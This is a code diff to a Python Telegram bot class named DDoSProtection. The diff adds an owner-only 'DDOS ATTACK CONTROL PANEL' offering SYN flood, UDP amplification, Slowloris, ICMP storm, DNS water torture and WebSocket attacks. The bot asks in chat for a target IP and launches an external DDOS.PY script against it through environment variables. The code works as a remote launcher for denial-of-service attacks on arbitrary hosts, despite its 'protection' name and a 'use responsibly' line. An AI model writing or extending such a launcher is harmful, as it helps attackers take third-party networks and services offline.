@@ -283,25 +283,30 @@ class DDoSProtection:
                 self.bot.send_message(message.chat.id, "❌ Access denied. Owner only command.")
                 return
             
-            try:
-                self.bot.send_message(message.chat.id, "🚀 Starting DDOS.py attack simulation...")
-                
-                # Execute DDOS.py
-                import subprocess
-                result = subprocess.run(
-                    ["python3", "/root/Protection-vc/DDOS.PY"],
-                    capture_output=True,
-                    text=True,
-                    timeout=30
-                )
-                
-                output = result.stdout if result.stdout else result.stderr
-                self.bot.send_message(message.chat.id, f"✅ DDOS.py executed!\n\nOutput:\n{output[:1000]}")
-                
-            except subprocess.TimeoutExpired:
-                self.bot.send_message(message.chat.id, "⚠️ DDOS.py execution timed out")
-            except Exception as e:
-                self.bot.send_message(message.chat.id, f"❌ Error executing DDOS.py: {str(e)}")
+            # Show attack menu with buttons
+            markup = types.InlineKeyboardMarkup(row_width=2)
+            markup.add(
+                types.InlineKeyboardButton("1. SYN Flood", callback_data="attack_syn"),
+                types.InlineKeyboardButton("2. UDP Amplification", callback_data="attack_udp"),
+                types.InlineKeyboardButton("3. HTTP Slowloris", callback_data="attack_slowloris"),
+                types.InlineKeyboardButton("4. ICMP Ping Storm", callback_data="attack_icmp"),
+                types.InlineKeyboardButton("5. DNS Water Torture", callback_data="attack_dns"),
+                types.InlineKeyboardButton("6. WebSocket", callback_data="attack_websocket")
+            )
+            
+            attack_menu = (
+                "⚡ <b>DDOS ATTACK CONTROL PANEL</b> ⚡\n\n"
+                "Select attack vector:\n"
+                "1. <b>SYN Flood</b> - TCP connection exhaustion\n"
+                "2. <b>UDP Amplification</b> - Bandwidth amplification\n"
+                "3. <b>HTTP Slowloris</b> - Connection starvation\n"
+                "4. <b>ICMP Ping Storm</b> - Packet flood overload\n"
+                "5. <b>DNS Water Torture</b> - Query bombardment\n"
+                "6. <b>WebSocket</b> - Protocol abuse\n\n"
+                "⚠️ Use responsibly and legally!"
+            )
+            
+            self.bot.send_message(message.chat.id, attack_menu, parse_mode="HTML", reply_markup=markup)
         
         @self.bot.callback_query_handler(func=lambda call: True)
         def callback(call):
@@ -309,6 +314,8 @@ class DDoSProtection:
             elif call.data == "alerts": send_alerts(call.message)
             elif call.data == "blocked": send_blocked(call.message)
             elif call.data == "test": test_cmd(call.message)
+            elif call.data.startswith("attack_"):
+                self.handle_attack_button(call)
     
     def setup_userbot_handlers(self):
         """Setup Pyrogram userbot handlers for voice chat monitoring"""
@@ -317,6 +324,102 @@ class DDoSProtection:
         
         # Userbot will be initialized when credentials are provided
         pass
+    
+    def handle_attack_button(self, call):
+        """Handle attack button clicks"""
+        # Owner-only check
+        if call.from_user.id != self.OWNER_ID:
+            self.bot.answer_callback_query(call.id, "❌ Access denied. Owner only command.")
+            return
+        
+        attack_type = call.data.replace("attack_", "")
+        attack_names = {
+            "syn": "SYN Flood",
+            "udp": "UDP Amplification", 
+            "slowloris": "HTTP Slowloris",
+            "icmp": "ICMP Ping Storm",
+            "dns": "DNS Water Torture",
+            "websocket": "WebSocket"
+        }
+        
+        attack_name = attack_names.get(attack_type, "Unknown")
+        
+        # Ask for target IP
+        msg = self.bot.send_message(
+            call.message.chat.id,
+            f"🎯 <b>{attack_name}</b> selected\n\n"
+            f"Send target IP address to launch attack:",
+            parse_mode="HTML"
+        )
+        
+        # Store the attack type for this user
+        self.bot.register_next_step_handler(msg, self.process_attack_target, attack_type)
+    
+    def process_attack_target(self, message, attack_type):
+        """Process the target IP and execute attack"""
+        # Owner-only check
+        if message.from_user.id != self.OWNER_ID:
+            self.bot.send_message(message.chat.id, "❌ Access denied. Owner only command.")
+            return
+        
+        target = message.text.strip()
+        
+        # Validate IP
+        import socket
+        try:
+            socket.inet_aton(target)
+        except socket.error:
+            self.bot.send_message(message.chat.id, "❌ Invalid IP address format")
+            return
+        
+        # Execute DDOS.PY with the attack type
+        try:
+            attack_names = {
+                "syn": "1",
+                "udp": "2",
+                "slowloris": "3", 
+                "icmp": "4",
+                "dns": "5",
+                "websocket": "6"
+            }
+            
+            method_id = attack_names.get(attack_type, "1")
+            
+            self.bot.send_message(
+                message.chat.id,
+                f"🚀 <b>Launching {attack_type.upper()} Attack</b>\n"
+                f"Target: {target}\n"
+                f"Method ID: {method_id}\n\n"
+                f"⚠️ Attack initiated via DDOS.PY",
+                parse_mode="HTML"
+            )
+            
+            # Execute DDOS.PY with parameters
+            import subprocess
+            env = os.environ.copy()
+            env['ATTACK_METHOD'] = method_id
+            env['ATTACK_TARGET'] = target
+            
+            result = subprocess.run(
+                ["python3", "/root/Protection-vc/DDOS.PY"],
+                capture_output=True,
+                text=True,
+                timeout=10,
+                env=env
+            )
+            
+            output = result.stdout if result.stdout else result.stderr
+            if output:
+                self.bot.send_message(
+                    message.chat.id,
+                    f"📊 <b>Attack Output:</b>\n\n{output[:500]}",
+                    parse_mode="HTML"
+                )
+            
+        except subprocess.TimeoutExpired:
+            self.bot.send_message(message.chat.id, "⚠️ DDOS.PY execution started (running in background)")
+        except Exception as e:
+            self.bot.send_message(message.chat.id, f"❌ Error: {str(e)}")
     
     def init_userbot(self, api_id, api_hash, phone):
         """Initialize Pyrogram userbot with credentials"""
